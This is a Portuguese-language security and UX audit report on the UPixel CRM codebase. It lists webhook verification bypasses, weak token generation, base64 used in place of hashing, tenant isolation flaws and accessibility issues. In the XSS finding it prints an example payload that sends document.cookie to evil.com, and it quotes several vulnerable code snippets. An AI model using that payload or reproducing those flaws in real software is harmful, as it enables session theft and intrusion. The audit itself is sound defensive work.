# Relatório de Auditoria Técnica — UPixel CRM

> **Engenheiro Responsável:** Análise Automatizada — Engenheiro Sênior / Arquiteto / QA  
> **Head de Design / Especialista UX:** Análise Automatizada — Head de Design & Arquiteto Frontend  
> **Data:** 15/04/2026  
> **Versão do Relatório:** 2.0 (inclui auditoria completa de UX/UI)

---

## Sumário Executivo

| Métrica | Valor |
|---|---|
| Arquivos analisados | 179 TSX/TS + 11 Edge Functions + 35 migrações SQL |
| Linhas de código | ~9.689 |
| Bugs críticos de segurança | **4** |
| Bugs de lógica | **3** |
| Resíduos de desenvolvimento | **6** |
| Cobertura de testes | **< 1%** |
| Instâncias de `console.*` em produção | **52** |
| Bypasses de tipagem `(as any)` | **26** |
| Problemas de UX/Formulários | **3** |
| Violações de acessibilidade (WCAG) | **4** |
| Componentes sem `aria-label` | **Múltiplos** |

**Stack:** React 18.3 · TypeScript · Vite · Supabase (PostgreSQL + Auth + Edge Functions Deno) · TailwindCSS · Zod · React Query  
**UI:** Radix UI · shadcn/ui · @dnd-kit · Reactflow · Recharts · lucide-react

---

## Seção 1 — Resíduos e Código Morto Encontrados

### 1.1 Console Statements Ativos em Produção

**52 ocorrências em 17 arquivos.** Código de debug vaza informações internas no browser e nos logs do servidor Supabase.

| Arquivo | Ocorrências | Risco |
|---|---|---|
| `src/contexts/AppContext.tsx` | 24 | Médio — erros de banco expostos |
| `src/hooks/useBroadcast.ts` | 3 | Médio |
| `supabase/functions/whatsapp-webhook/index.ts` | 5+ | **Alto** — loga corpo de requisição HTTP com telefones e conteúdo de mensagens reais |

Exemplo crítico em `whatsapp-webhook/index.ts:487`:
```typescript
console.log("Webhook received:", JSON.stringify(body).slice(0, 500));
// Expõe número de telefone, nome e conteúdo da mensagem nos logs do servidor
```

---

### 1.2 Bypass de Tipagem TypeScript — `(supabase.from as any)`

**26 ocorrências em 5 arquivos.** O compilador TypeScript ignora completamente as chamadas marcadas com `as any`, impedindo detecção de erros em tempo de compilação.

| Arquivo | Ocorrências |
|---|---|
| `src/contexts/AppContext.tsx` | 12 |
| `src/components/intelligence/AgentsTab.tsx` | 5 |
| `src/components/integrations/WebhookSettingsModal.tsx` | 4 |
| `src/components/integrations/ApiSettingsModal.tsx` | 4 |
| `src/components/alexandria/RAGIntegrationStatus.tsx` | 1 |

---

### 1.3 Mock Data Importado no Contexto Principal

**Arquivo:** `src/contexts/AppContext.tsx:4`

```typescript
import { mockAutomations } from "@/lib/mock-data";
```

Dados fictícios importados no contexto central da aplicação. Dependendo do merge entre `automation_rules` reais e `mockAutomations`, automações fantasmas podem aparecer para usuários ou ações mock podem ser executadas contra leads reais.

---

### 1.4 Fallback Hardcoded de `client_id`

**Arquivo:** `src/contexts/AppContext.tsx:80`

```typescript
const clientId = userData.user?.user_metadata?.client_id || "c1";
```

Se o `user_metadata` não contiver `client_id`, o sistema usa silenciosamente `"c1"` como identificador de tenant — potencialmente expondo dados de outro cliente para o usuário errado.

---

### 1.5 Dados de Negócio Armazenados em `localStorage`

**Arquivo:** `src/pages/LeadProfilePage.tsx:48,63,107,310,331`

```typescript
localStorage.setItem("totum_notes", JSON.stringify(updated));
localStorage.setItem(`totum_custom_fields_${id}`, JSON.stringify(updated));
```

- **Notas de leads** e **campos customizados** são persistidos apenas no `localStorage` — ao trocar de dispositivo, browser ou limpar cache, o usuário perde todos os dados.
- As chaves usam o prefixo `totum_` — resíduo do nome anterior do produto, indica que essa feature nunca foi migrada adequadamente.

---

### 1.6 Tags Globais Hardcoded no Estado Inicial

**Arquivo:** `src/contexts/AppContext.tsx:72`

```typescript
const [globalTags, setGlobalTags] = useState<string[]>(["Hot", "Warm", "Cold", "Enterprise", "Agência"]);
```

Estado inicial com valores fixos misturando inglês e português. Pode conflitar com tags vindas do banco de dados, gerando duplicatas visíveis para o usuário.

---

## Seção 2 — Riscos Potenciais e Erros Críticos (Bugs)

### BUG CRÍTICO #1 — Bypass de Verificação de Webhook Meta/WhatsApp

**Severidade:** Crítica  
**Arquivo:** `supabase/functions/whatsapp-webhook/index.ts:476`

```typescript
// VULNERABILIDADE
if (validToken || (integrations && integrations.length > 0)) {
  return new Response(challenge || "", { status: 200, headers: corsHeaders });
}
```

A condição `|| (integrations && integrations.length > 0)` torna o `validToken` irrelevante. **Qualquer atacante** que conheça a URL da Edge Function pode completar a verificação do webhook da Meta com um token arbitrário, desde que exista ao menos uma integração WhatsApp Official cadastrada. Com isso, um atacante pode registrar um webhook fraudulento e receber cópias de todas as mensagens de WhatsApp dos seus usuários.

---

### BUG CRÍTICO #2 — Geração Criptograficamente Fraca de Tokens de API

**Severidade:** Crítica  
**Arquivo:** `src/components/integrations/ApiSettingsModal.tsx:39`  
**Arquivo:** `src/components/integrations/WebhookSettingsModal.tsx:81`

```typescript
// ApiSettingsModal — token de API
const token = "sk_live_" + Array.from({ length: 32 }, () =>
  Math.random().toString(36)[2] || '0'
).join('');

// WebhookSettingsModal — webhook secret
const secret = "wh_sec_" + Array.from({ length: 24 }, () =>
  Math.random().toString(36)[2] || '0'
).join('');
```

`Math.random()` **não é criptograficamente seguro**. O PRNG interno do V8 (motor JavaScript) é determinístico e previsível. A entropia real dos tokens é significativamente menor do que os caracteres gerados sugerem, tornando-os vulneráveis a ataques de força bruta ou previsão de sequência.

---

### BUG CRÍTICO #3 — Token de API Armazenado com Codificação Reversível (Base64)

**Severidade:** Crítica  
**Arquivo:** `src/components/integrations/ApiSettingsModal.tsx:45`

```typescript
token_hash: btoa(token), // In production, use proper hashing
```

`btoa()` é **codificação Base64**, não hash criptográfico. É 100% reversível com `atob(token_hash)`. Qualquer pessoa com acesso de leitura ao banco (via vazamento de backup, acesso indevido ao Supabase Studio ou falha de RLS) recupera todos os tokens de API em texto plano. O próprio comentário no código confirma que isso é um placeholder que nunca foi substituído.

---

### BUG CRÍTICO #4 — XSS via Renderização de HTML de E-mail Sem Sanitização

**Severidade:** Crítica  
**Arquivo:** `src/components/google/GmailTab.tsx:309`

```typescript
<div dangerouslySetInnerHTML={{ __html: viewEmail.body }} />
```

O corpo do e-mail é renderizado diretamente como HTML sem qualquer sanitização. Um atacante pode enviar um e-mail com payload JavaScript malicioso:

```html
<img src=x onerror="fetch('https://evil.com/steal?t='+document.cookie)">
```

Isso executa no contexto do browser do usuário autenticado, podendo roubar sessões, tokens JWT e dados sensíveis.

---

### BUG DE LÓGICA #5 — Reconexão WhatsApp Nunca Processa

**Severidade:** Alta  
**Arquivo:** `supabase/functions/whatsapp-webhook/index.ts:518-521`

```typescript
await adminClient.from("integrations").update({ status: newStatus })
  .eq("provider", "whatsapp")
  .eq("status", "connected")        // BUG: só atualiza se já estiver "connected"
  .filter("config->>instance_name", "eq", instanceName);
```

Quando o WhatsApp reconecta após uma queda (`state === "open"` → `newStatus = "connected"`), o filtro `.eq("status", "connected")` exige que o registro já esteja como "connected". Como após uma queda o status é "disconnected", a query retorna 0 linhas atualizadas. **O status fica preso em "disconnected" permanentemente após qualquer desconexão.**

---

### BUG DE LÓGICA #6 — Recursão Sem Limite de Profundidade no Parser de E-mail

**Severidade:** Média  
**Arquivo:** `src/components/google/GmailTab.tsx:100-104`

```typescript
const processPart = (part: any) => {
  if (part.mimeType === "text/html" && part.body?.data) html = decode(part.body.data);
  if (part.parts) part.parts.forEach(processPart); // recursão sem controle
};
```

Um e-mail MIME com partes aninhadas arbitrariamente (ou estrutura circular maliciosa) pode esgotar a call stack do browser com `Maximum call stack size exceeded`, crashando o componente de e-mail.

---

### BUG DE LÓGICA #7 — Embedding Nulo Quebra o Sistema RAG Silenciosamente

**Severidade:** Alta  
**Arquivo:** `supabase/functions/ai-chat/index.ts:38-44`

```typescript
if (embedding.length > 384) embedding = embedding.slice(0, 384);
while (embedding.length < 384) embedding.push(0); // preenche com zeros se vazio
const norm = Math.sqrt(embedding.reduce((s, v) => s + v * v, 0)) || 1;
return embedding.map((v) => v / norm);
```

Se o modelo retornar um array vazio `[]`, o loop `while` preenche 384 zeros. A norma resultante é `0`, o fallback `|| 1` evita divisão por zero, mas o embedding normalizado é um vetor de zeros — matematicamente inválido para busca por similaridade. Todas as buscas semânticas retornariam similaridade próxima de zero sem nenhum erro visível, degradando completamente o RAG em silêncio.

---

### PROBLEMA DE SEGURANÇA #8 — CORS Wildcard em Todas as Edge Functions

**Severidade:** Média  
**Arquivo:** `supabase/functions/ai-chat/index.ts:4` (padrão replicado em todas as 11 funções)

```typescript
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
};
```

Aceita requisições de qualquer origem. Embora o `ai-chat` exija JWT, os endpoints de webhook aceitam POSTs de qualquer domínio sem verificação de origem.

---

### PROBLEMA DE SEGURANÇA #9 — Dessincronia de `client_id` entre AuthContext e AppContext

**Severidade:** Alta  
**Arquivo:** `src/contexts/AppContext.tsx:80` + `src/contexts/AuthContext.tsx`

O `AppContext` obtém `client_id` do `user_metadata` do Supabase Auth — dados que **podem ser modificados pelo próprio usuário** via `supabase.auth.updateUser()`. Um usuário mal-intencionado pode alterar seu `client_id` e acessar dados de outro tenant. A isolação deve ser feita exclusivamente via RLS no banco.

---

## Seção 3 — Relatório de Testes

### 3.1 Teste de Caixa Branca (Análise Estrutural Interna)

**Cobertura de testes atual: < 1%**  
Existe apenas 1 arquivo de teste (`src/test/example.test.ts`) sem implementação real.

#### Caminhos críticos sem cobertura de teste:

**a) `findOrCreateLead` — Deduplicação por sufixo de telefone**

O algoritmo usa `phone.ilike.%${phoneSuffix}%` (últimos 8 dígitos). Cenários sem teste:
- Dois leads de clientes diferentes com mesma terminação de número
- Número de telefone com menos de 8 dígitos
- Race condition: duas mensagens simultâneas do mesmo número → dois `INSERT` paralelos → dados duplicados

**b) `executeAutomationsRef` — Referência possivelmente nula**

```typescript
const executeAutomationsRef = useRef<(...) | null>(null);
```

Se um lead for criado antes do componente de automações montar no React tree, a ref é `null` e o trigger é silenciosamente descartado, sem log e sem erro para o usuário.

**c) Geração de Embedding — Divisão por Zero Potencial**

```typescript
const norm = Math.sqrt(embedding.reduce((s, v) => s + v * v, 0)) || 1;
```

Testado apenas no caminho feliz. Array vazio ou todos zeros não têm cobertura.

**d) Lógica de Permissões — `canAccessModule`**

```typescript
const basePath = "/" + path.split("/").filter(Boolean)[0] || "/";
```

Precedência de operadores: `"/" + undefined || "/"` avalia como `"/" + undefined` = `"/undefined"`, não `"/"`. Rotas com segmentos inesperados podem retornar permissões incorretas.

---

### 3.2 Teste de Caixa Cinza (Comunicação entre Camadas)

**a) Race condition entre AuthContext e AppContext na inicialização**

```
1. AuthContext: onAuthStateChange dispara → setTimeout(0) → busca profile
2. AppContext: fetchAll() começa ANTES → usa client_id do user_metadata (pode ser null)
3. client_id = null → fallback "c1" → dados do tenant errado são carregados
4. AuthContext: profile chega → usuário vê dados inconsistentes
```

**b) Webhook WhatsApp sem atomicidade**

A sequência `upsertConversationAndMessage` não usa transação:
1. Cria/atualiza conversa ✓
2. Insere mensagem — **se falhar aqui**, a conversa existe sem mensagem

O sistema fica em estado inconsistente sem mecanismo de rollback.

**c) Credenciais OAuth Google armazenadas em texto na tabela `integrations`**

O `client_secret` do OAuth fica na coluna `config` da tabela `integrations`. Qualquer acesso de leitura ao banco expõe as credenciais OAuth — sem campo encriptado, sem separação de secrets.

**d) Usuário bloqueado com JWT ativo ainda opera**

O bloqueio via `is_blocked = true` é verificado **apenas no frontend** no `AuthContext`. Um usuário bloqueado com sessão JWT válida pode fazer requisições diretas às Edge Functions e ao Supabase até o token expirar (padrão: 1 hora). O RLS precisa verificar `is_blocked` também.

---

### 3.3 Teste de Caixa Preta (Simulação de Entradas do Usuário Final)

| Cenário | Input Testado | Resultado Esperado | Resultado Real |
|---|---|---|---|
| Lead com nome HTML | `<script>alert(1)</script>` | Sanitizado ou recusado | Salvo no banco; React escapa no JSX — seguro na listagem, risco em templates |
| Webhook URL inválida | `https://` (sem host) | Erro de validação | **Passa a validação** — registrado com URL quebrada |
| E-mail injetado no compose | `"x" <a@b.com>; admin@c.com` | Só envia para destinatário informado | Depende da Edge Function — sem validação no frontend |
| Busca de lead com caracteres PostgREST | `phone: ,(()` | Tratado como string literal | Possível query malformada via `.or()` com interpolação |
| Criação de chave API com nome vazio | `""` (string vazia) | Bloqueado pela validação | **Bloqueado corretamente** — `if (!newKeyName.trim())` funciona |
| Acesso ao `/automations` como `atendente` | — | Redirecionado | `canAccessModule` verifica corretamente |
| Tentativa de deletar lead sem permissão | Role `atendente` | Bloqueado | Verificado via `hasPermission("crm.delete")` — **OK** |

---

## Seção 4 — Plano de Ação para Refatoração

> Detalhado no arquivo `docs/fix-guide.md`

### Resumo de Prioridades

| Prioridade | Itens | Prazo Sugerido |
|---|---|---|
| P1 — Segurança Crítica | 5 correções | Imediato |
| P2 — Bugs de Lógica e Integridade | 5 correções | Esta semana |
| P3 — Qualidade e Manutenção | 6 melhorias | Este mês |
| P4 — UX/UI e Acessibilidade | 7 melhorias | Este mês |

---

## Seção 5 — Auditoria de UX/UI e Design System

---

### 5.1 Design System e Tokens — Pontos Fortes

O sistema de design do UPixel demonstra maturidade técnica acima da média para um CRM em estágio inicial. A leitura de `index.css`, `tailwind.config.ts` e dos componentes base revelou:

- **Tokens HSL relacionais** — paleta baseada em variáveis CSS HSL (`--primary`, `--secondary`, `--muted-foreground`) com suporte nativo a dark/light mode via seletor `.dark`. Nenhum valor hexadecimal hardcoded nos componentes base.
- **Tema duplo funcional** — "Kinetic Noir" (dark) e "Curated Kinetic" (light) implementados e comutáveis. Classes utilitárias como `neon-glow`, `kinetic-pulse` e `glassmorphism` criam identidade visual coerente.
- **Primitivas Radix UI** — `Button`, `Dialog`, `Select`, `Table`, `Input` são wrappers sobre Radix UI, herdando automaticamente: focus trapping em modais, `aria-expanded`, `aria-describedby`, navegação por teclado. Isso representa uma base de acessibilidade sólida que não precisa ser reconstruída do zero.
- **Variantes via `cva`** — o componente `Button` usa `class-variance-authority` com variantes semânticas (`destructive`, `outline`, `ghost`, `link`) e tamanhos (`sm`, `lg`, `icon`), evitando classes mágicas espalhadas.

---

### 5.2 Problema de UX — Formulários sem Validação Inline

**Arquivo:** `src/components/crm/LeadFormModal.tsx`  
**Severidade:** Alta — impacto direto na conversão e satisfação do operador

#### O Problema

A validação atual é baseada exclusivamente em desabilitar o botão de submissão:

```typescript
// LeadFormModal.tsx — estado local sem validação inline
const [form, setForm] = useState<Partial<Lead>>({});

// Botão bloqueado sem feedback explicativo
<Button onClick={handleSubmit} disabled={!form.name?.trim()}>
  Salvar Lead
</Button>
```

**Impacto cognitivo:** O operador não sabe *por que* o botão está cinza. Campos obrigatórios não são sinalizados visualmente. Não há mensagens de erro contextuais abaixo dos inputs. Isso viola a **Heurística #1 de Nielsen** (Visibilidade do status do sistema) e a **Heurística #9** (Ajudar usuários a reconhecer, diagnosticar e recuperar erros).

#### Situação atual vs esperada

| Comportamento | Atual | Esperado |
|---|---|---|
| Campo obrigatório vazio | Botão cinza silencioso | Borda vermelha + mensagem "Campo obrigatório" |
| E-mail inválido | Aceito sem aviso | "Informe um e-mail válido (ex: nome@empresa.com)" |
| Telefone sem máscara | Aceito qualquer string | Formatação automática "(11) 99999-9999" |
| Submit com erro | Nada acontece | Scroll automático ao primeiro campo inválido |

---

### 5.3 Problema de UX — Ausência de Máscaras de Input

**Arquivos:** `src/components/crm/LeadFormModal.tsx`, `src/pages/LeadProfilePage.tsx`  
**Severidade:** Média

Campos sensíveis à formatação são do tipo `text` simples, sem máscara automática nem `inputMode` para direcionar o teclado correto em dispositivos móveis:

| Campo | `type` atual | `inputMode` necessário | Máscara necessária |
|---|---|---|---|
| Telefone | `text` | `tel` | `(99) 99999-9999` |
| Valor do negócio | `text` | `decimal` | `R$ 9.999,99` |
| CPF/CNPJ (se aplicável) | `text` | `numeric` | `999.999.999-99` |

Em dispositivos móveis (Android/iOS), sem `inputMode="tel"` o usuário recebe o teclado QWERTY completo para preencher um telefone — fricção desnecessária que aumenta o tempo de cadastro e taxa de erro.

---

### 5.4 Problema de Performance — Kanban sem Virtualização de Lista

**Arquivo:** `src/components/crm/KanbanColumn.tsx`  
**Severidade:** Média — degradação progressiva conforme volume de dados

O componente renderiza **todos os cards** de uma coluna no DOM simultaneamente:

```typescript
// KanbanColumn.tsx — sem virtualização
{leads.map((lead) => (
  <KanbanCard key={lead.id} lead={lead} ... />
))}
```

Com 50+ leads por coluna, o DOM acumula centenas de nós simultâneos. Em máquinas com hardware modesto (notebooks com 4GB RAM, por exemplo), o scroll do Kanban se torna visivelmente lento e o drag-and-drop perde responsividade. A biblioteca `@tanstack/react-virtual` já está disponível no ecossistema React Query (mesma organização) e resolveria isso sem reescrever a lógica.

---

### 5.5 Problema de UX — Estados Vazios sem Contexto Educativo

**Arquivos:** múltiplos (`CRMPage.tsx`, listagens de tarefas, campanhas, relatórios)  
**Severidade:** Média

Quando filtros ou buscas não retornam resultados, vários componentes simplesmente renderizam uma área em branco ou uma mensagem genérica. O padrão correto para CRMs é um **Empty State** que:

1. Indica visualmente que não há dados (ilustração ou ícone contextual)
2. Explica o motivo provável (filtro ativo, nenhum registro ainda)
3. Oferece uma CTA direta para resolver a situação ("Remover filtros" ou "Cadastrar primeiro lead")

Exemplo de localização identificada no `CRMPage.tsx`:
```typescript
// Quando filteredLeads.length === 0, exibe apenas a estrutura de colunas vazia
// sem orientação ao usuário sobre o que fazer a seguir
```

---

### 5.6 Problema de Acessibilidade — Botões de Ação Sem `aria-label`

**Arquivos:** `KanbanColumn.tsx`, `CRMPage.tsx`, `AppSidebar.tsx` e múltiplos outros  
**Severidade:** Alta — viola WCAG 2.1 critério 4.1.2 (Nível A, obrigatório)

Botões "ghost" que contêm apenas ícones SVG não têm texto descritível para leitores de tela:

```typescript
// KanbanColumn.tsx — botão sem aria-label
<Button variant="ghost" size="icon" onClick={() => onDeleteColumn(column.id)}>
  <Trash2 className="h-4 w-4" />
  {/* Nenhum texto, nenhum aria-label — leitor de tela anuncia "botão" sem contexto */}
</Button>
```

Um usuário com deficiência visual navegando pelo teclado ouve "botão" sem saber que é "Deletar coluna". Isso torna a funcionalidade completamente inacessível para essa audiência.

**Padrão correto:**
```typescript
<Button
  variant="ghost"
  size="icon"
  onClick={() => onDeleteColumn(column.id)}
  aria-label="Deletar coluna"
>
  <Trash2 className="h-4 w-4" aria-hidden="true" />
</Button>
```

---

### 5.7 Problema de Acessibilidade — Hierarquia Semântica HTML Ausente

**Arquivos:** `CRMPage.tsx`, `AppLayout.tsx`, páginas em geral  
**Severidade:** Média — viola WCAG 1.3.1 (Informação e Relacionamentos)

O layout central da aplicação usa `<div>` aninhadas como estrutura principal, sem elementos semânticos HTML5:

```typescript
// AppLayout.tsx — estrutura puramente visual, sem semântica
<div className="flex h-screen overflow-hidden bg-background">
  <div> {/* sidebar */} </div>
  <div className="flex-1 flex flex-col overflow-hidden">
    <div> {/* header */} </div>
    <div> {/* conteúdo principal */} </div>
  </div>
</div>
```

**Estrutura esperada (WCAG 1.3.1):**
```typescript
<div className="flex h-screen overflow-hidden bg-background">
  <nav aria-label="Navegação principal"> {/* sidebar */} </nav>
  <div className="flex-1 flex flex-col overflow-hidden">
    <header> {/* header */} </header>
    <main id="main-content"> {/* conteúdo principal */} </main>
  </div>
</div>
```

Leitores de tela como NVDA e VoiceOver usam landmarks (`<nav>`, `<main>`, `<header>`) para permitir navegação rápida — sem eles, o usuário precisa percorrer todo o DOM linearmente.

---

### 5.8 Problema de Acessibilidade — Contraste em Light Mode

**Arquivo:** `src/index.css` — tema `:root` (Curated Kinetic)  
**Severidade:** Média — pode violar WCAG 1.4.3 (Contraste Mínimo, Nível AA)

Algumas combinações de cor no tema claro merecem verificação com ferramentas de contraste:

| Combinação | Uso | Verificação necessária |
|---|---|---|
| `text-muted-foreground` sobre `bg-secondary/20` | Labels, hints, datas | Pode estar abaixo de 4.5:1 (AA) |
| `text-muted-foreground` sobre `bg-muted/50` | Placeholders, subtítulos | Provável falha em AA |
| Texto em badges `bg-primary/10` | Tags coloridas | Verificar com ferramenta |

Recomendado: rodar o [WebAIM Contrast Checker](https://webaim.org/resources/contrastchecker/) ou a extensão axe DevTools nas principais telas em light mode.

---

### 5.9 Problema de UX Mobile — Conflito entre Scroll e Drag-and-Drop

**Arquivo:** `src/pages/CRMPage.tsx`  
**Severidade:** Média — quebra a usabilidade no mobile/tablet

O `@dnd-kit` usa `PointerSensor` com `activationConstraint: { distance: 5 }`. No desktop isso é ideal — evita drags acidentais. No mobile/tablet, no entanto, o dedo faz scroll pela página com os mesmos eventos de pointer, e uma distância de 5px é facilmente atingida durante um scroll normal, ativando o drag quando o usuário queria apenas rolar.

```typescript
// Configuração atual — apenas PointerSensor
const sensors = useSensors(useSensor(PointerSensor, {
  activationConstraint: { distance: 5 },
}));
```

Sem um `TouchSensor` dedicado com `delay` adequado, arrastar cards no mobile é não-intencional e frustrante.

---

## Apêndice — Inventário de Arquivos com Risco

### Segurança e Lógica

| Arquivo | Problema | Severidade |
|---|---|---|
| `supabase/functions/whatsapp-webhook/index.ts` | Bypass de verificação, bug de reconexão, N+1 queries, logs sensíveis | Crítica |
| `src/components/integrations/ApiSettingsModal.tsx` | Token fraco, hash reversível | Crítica |
| `src/components/integrations/WebhookSettingsModal.tsx` | Secret fraco, URL sem validação robusta | Crítica |
| `src/components/google/GmailTab.tsx` | XSS via `dangerouslySetInnerHTML`, recursão sem limite | Crítica |
| `src/contexts/AppContext.tsx` | `client_id` inseguro, fallback hardcoded, mock data misturado | Alta |
| `src/pages/LeadProfilePage.tsx` | Dados de negócio em `localStorage`, prefixo `totum_` desatualizado | Média |
| `supabase/functions/ai-chat/index.ts` | CORS wildcard, embedding vazio sem tratamento | Média |
| `src/hooks/usePermissions.ts` | Precedência de operadores em `canAccessModule` | Baixa |
| `src/contexts/AuthContext.tsx` | Bloqueio de usuário apenas no frontend | Alta |

### UX/UI e Acessibilidade

| Arquivo | Problema | Severidade WCAG / UX |
|---|---|---|
| `src/components/crm/LeadFormModal.tsx` | Sem validação inline, sem RHF+Zod | Alta — UX |
| `src/components/crm/LeadFormModal.tsx` | Campos sem máscara, sem `inputMode` | Média — UX |
| `src/components/crm/KanbanColumn.tsx` | Botões ícone sem `aria-label` | Alta — WCAG 4.1.2 (A) |
| `src/components/crm/KanbanColumn.tsx` | Sem virtualização para listas longas | Média — Performance |
| `src/pages/CRMPage.tsx` | `PointerSensor` conflita com scroll mobile | Média — UX |
| `src/components/layout/AppLayout.tsx` | Sem elementos semânticos HTML5 (`nav`, `main`, `header`) | Média — WCAG 1.3.1 (A) |
| `src/index.css` | Possíveis falhas de contraste no light mode | Média — WCAG 1.4.3 (AA) |
| Múltiplos | Empty states sem componente padronizado e educativo | Média — UX |
